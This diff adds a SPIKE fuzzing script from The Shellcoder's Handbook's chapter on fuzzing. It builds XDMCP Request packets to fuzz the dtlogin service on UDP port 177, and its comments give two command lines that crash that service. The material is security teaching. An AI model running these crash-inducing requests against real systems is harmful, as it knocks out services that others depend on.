@@ -1,0 +1,85 @@
+/*
+
+The Shellcoder's Handbook: Discovering and Exploiting Security Holes
+Jack Koziol, David Litchfield, Dave Aitel, Chris Anley, 
+Sinan Eren, Neel Mehta, Riley Hassell
+Publisher: John Wiley & Sons
+ISBN: 0764544683
+
+Chapter 15: Art of Fuzzing
+dtlogin SPIKE
+
+Please send comments/feedback to jack@infosecinstitute.com or visit http://www.infosecinstitute.com 
+
+*/
+
+//xdmcp_request.spk
+//compatable with SPIKE 2.6 or above
+//port 177 UDP
+//use these requests to crash it:
+//[dave@localhost src]$ ./generic_send_udp 192.168.1.104 177 ~/spikePRIVATE/xdmcp_request.spk 2 28 2 
+//[dave@localhost src]$ ./generic_send_udp 192.168.1.104 177 ~/spikePRIVATE/xdmcp_request.spk 4 19 1
+
+//version
+s_binary("00 01");
+//Opcode (request=07)
+//3 is onebyte
+//5 is two byte big endian
+s_int_variable(0x0007,5);
+//message length
+//s_binary("00 17 ");
+s_binary_block_size_halfword_bigendian("message");
+s_block_start("message");
+//display number
+s_int_variable(0x0001,5);
+//connections
+s_binary("01");
+//internet type
+s_int_variable(0x0000,5);
+//address 192.168.1.100
+//connection 1
+s_binary("01");
+//size in bytes
+//s_binary("00 04");
+s_binary_block_size_halfword_bigendian("ip");
+//ip
+s_block_start("ip");
+s_binary("c0 a8 01 64");
+s_block_end("ip");
+//authentication name
+//s_binary("00 00");
+s_binary_block_size_halfword_bigendian("authname");
+s_block_start("authname");
+s_string_variable("");
+s_block_end("authname");
+
+//authentication data
+s_binary_block_size_halfword_bigendian("authdata");
+s_block_start("authdata");
+s_string_variable("");
+s_block_end("authdata");
+//s_binary("00 00");
+//authorization names (2)
+//3 is one byte
+s_int_variable(0x02,3);
+
+//size of string in big endian halfword order
+s_binary_block_size_halfword_bigendian("MIT");
+s_block_start("MIT");
+s_string_variable("MIT-MAGIC-COOKIE-1");
+s_block_end("MIT");
+
+
+s_binary_block_size_halfword_bigendian("XC");
+s_block_start("XC");
+s_string_variable("XC-QUERY-SECURITY-1");
+s_block_end("XC");
+
+
+//manufacture display id
+s_binary_block_size_halfword_bigendian("DID");
+s_block_start("DID");
+s_string_variable("");
+s_block_end("DID");
+
+s_block_end("message");
